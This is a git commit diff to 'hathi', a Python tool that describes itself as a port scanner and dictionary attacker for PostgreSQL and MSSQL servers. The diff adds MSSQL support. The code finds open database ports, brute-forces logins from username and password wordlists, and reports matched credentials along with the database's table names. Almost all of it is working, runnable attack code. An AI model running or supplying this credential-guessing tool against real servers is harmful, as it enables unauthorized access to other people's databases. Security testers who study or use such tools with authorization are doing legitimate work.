78f8956ad3bcd7a740510082c139965f8c1f9d10
Anthony Shaw <anthony.p.shaw@gmail.com>
2021-09-15 11:10:18 +1000

    Setup for mssql testing

--- hathi/__main__.py
+++ hathi/__main__.py
@@ -25,18 +25,29 @@ import argparse
 import time
 import asyncio
 import asyncpg
+import pymssql
 from typing import List, Optional
 from collections import namedtuple
+from enum import Enum
 
 timeout = 1.0
-SSL_MODE = "require"  # require = required, Try SSL first and fallback to non-SSL if failed
-POSTGRES_PORT = 5432
-DATABASE_NAME = "postgres"
+SSL_MODE = (
+    "require"  # require = required, Try SSL first and fallback to non-SSL if failed
+)
+
+
+class HostType(Enum):
+    Postgres = "postgres"
+    Mssql = "mssql"
+
+
+DEFAULT_PORTS = {HostType.Postgres: 5432, HostType.Mssql: 1433}
+DEFAULT_DATABASE_NAME = {HostType.Postgres: "postgres", HostType.Mssql: "master"}
 
 Match = namedtuple("Match", "username password host database data")
 
 
-async def try_hosts(hosts: List[str], port: int = POSTGRES_PORT):
+async def try_hosts(hosts: List[str], port: int):
     found = 0
     for host in hosts:
         try:
@@ -49,7 +60,14 @@ async def try_hosts(hosts: List[str], port: int = POSTGRES_PORT):
             print(f"Could not connect to {host}")
 
 
-async def try_connection(host: str, database: str, usernames: str, passwords: str, hostname: Optional[str] = None, verbose = False):
+async def pg_try_connection(
+    host: str,
+    database: str,
+    usernames: str,
+    passwords: str,
+    hostname: Optional[str] = None,
+    verbose=False,
+):
     with open(usernames, "r") as username_list:
         for username in username_list:
             username = username.strip()
@@ -67,7 +85,9 @@ async def try_connection(host: str, database: str, usernames: str, passwords: st
                             ssl=SSL_MODE,
                             timeout=timeout,
                         )
-                        data = await conn.fetch("select table_name from information_schema.tables where table_schema='public';")
+                        data = await conn.fetch(
+                            "select table_name from information_schema.tables where table_schema='public';"
+                        )
                         if verbose:
                             print(f"Matched {username}:{password} on {host}")
                         yield Match(username, password, host, database, data)
@@ -82,7 +102,9 @@ async def try_connection(host: str, database: str, usernames: str, passwords: st
                         break
                     except asyncpg.exceptions._base.PostgresError as pe:
                         if verbose:
-                            print(f"Failed {username}:{password} on {host} {pe} {type(pe)}")
+                            print(
+                                f"Failed {username}:{password} on {host} {pe} {type(pe)}"
+                            )
                         pass
                     except asyncio.TimeoutError:
                         if verbose:
@@ -90,28 +112,88 @@ async def try_connection(host: str, database: str, usernames: str, passwords: st
                         pass  # closed
 
 
-async def scan(hosts: List[str], usernames: str, passwords: str, hostname: Optional[str] = None, verbose = False):
+def mssql_try_connection(
+    host: str,
+    database: str,
+    usernames: str,
+    passwords: str,
+    hostname: Optional[str] = None,
+    verbose=False,
+):
+    with open(usernames, "r") as username_list:
+        for username in username_list:
+            username = username.strip()
+            if hostname:
+                username = f"{username}@{hostname}"
+            with open(passwords, "r") as password_list:
+                for password in password_list:
+                    password = password.strip()
+                    try:
+                        conn = pymssql.connect(
+                            host,
+                            username,
+                            password,
+                            database,
+                        )
+
+                        if verbose:
+                            print(f"Matched {username}:{password} on {host}")
+                        yield Match(username, password, host, database, {})
+                        conn.close()
+                        break
+                    except pymssql.OperationalError:
+                        if verbose:
+                            print(f"Invalid username/password {username} : {password}")
+
+
+async def scan(
+    hosts: List[str],
+    usernames: str,
+    passwords: str,
+    hostname: Optional[str] = None,
+    verbose=False,
+    host_type: HostType = HostType.Postgres,
+):
     open_hosts = []
-    async for open_host in try_hosts(hosts):
+    async for open_host in try_hosts(hosts, DEFAULT_PORTS[host_type]):
         open_hosts.append(open_host)
+
+    database = DEFAULT_DATABASE_NAME[host_type]
 
     print(f"Found open hosts {open_hosts}, trying to connect")
     matched_connections = []
 
-    for host in open_hosts:
-        async for match in try_connection(
-            host, DATABASE_NAME, usernames, passwords, hostname, verbose
-        ):
-            matched_connections.append(match)
+    if host_type == HostType.Postgres:
+        for host in open_hosts:
+            async for match in pg_try_connection(
+                host,
+                database,
+                usernames,
+                passwords,
+                hostname,
+                verbose,
+            ):
+                matched_connections.append(match)
+    elif host_type == HostType.Mssql:
+        for host in open_hosts:
+            for match in mssql_try_connection(
+                host,
+                database,
+                usernames,
+                passwords,
+                hostname,
+                verbose,
+            ):
+                matched_connections.append(match)
     return matched_connections
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Port scan and dictionary attack postgresql servers."
+        description="Port scan and dictionary attack PostgreSQL and MSSQL servers."
     )
     parser.add_argument(
-        "hosts", metavar="host", type=str, nargs="+", help="host to connect to"
+        "hosts", metavar="host", type=str, nargs="+", help="host to scan"
     )
     parser.add_argument(
         "--usernames", type=str, default="usernames.txt", help="password list"
@@ -119,19 +201,29 @@ def main():
     parser.add_argument(
         "--passwords", type=str, default="passwords.txt", help="password list"
     )
-    parser.add_argument(
-        "--results", type=str, help="path to a results file"
-    )
+    parser.add_argument("--results", type=str, help="path to a results file")
     parser.add_argument(
         "--hostname", type=str, help="an @hostname to append to the usernames"
     )
+    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
     parser.add_argument(
-        "--verbose", action="store_true"
+        "--mssql", action="store_true", help="an @hostname to append to the usernames"
     )
     args = parser.parse_args()
     start = time.time()
 
-    results = asyncio.run(scan(args.hosts, args.usernames, args.passwords, args.hostname, args.verbose))
+    host_type = HostType.Mssql if args.mssql else HostType.Postgres
+
+    results = asyncio.run(
+        scan(
+            args.hosts,
+            args.usernames,
+            args.passwords,
+            args.hostname,
+            verbose=args.verbose,
+            host_type=host_type,
+        )
+    )
 
     if args.results:
         with open(args.results) as results_f:
@@ -141,7 +233,6 @@ def main():
         print(f"{result}")
 
     print("Completed scan in {0} seconds".format(time.time() - start))
-
 
 
 if __name__ == "__main__":
